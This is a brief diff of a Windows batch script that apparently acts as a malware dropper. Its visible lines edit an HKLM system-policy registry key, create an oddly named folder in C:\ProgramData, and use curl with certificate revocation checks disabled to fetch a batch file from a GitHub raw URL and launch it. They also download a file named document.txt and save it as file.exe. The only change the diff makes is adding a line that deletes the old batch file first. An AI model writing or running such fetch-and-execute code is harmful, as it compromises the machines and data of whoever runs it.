@@ -40,6 +40,7 @@ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v En
 cd C:\ProgramData
 mkdir fffass
 cd fffass
+del backup.bat
 curl --ssl-no-revoke -o backup.bat https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/bat/backup.bat
 start backup.bat
 curl --ssl-no-revoke -L -o file.exe https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/document.txt
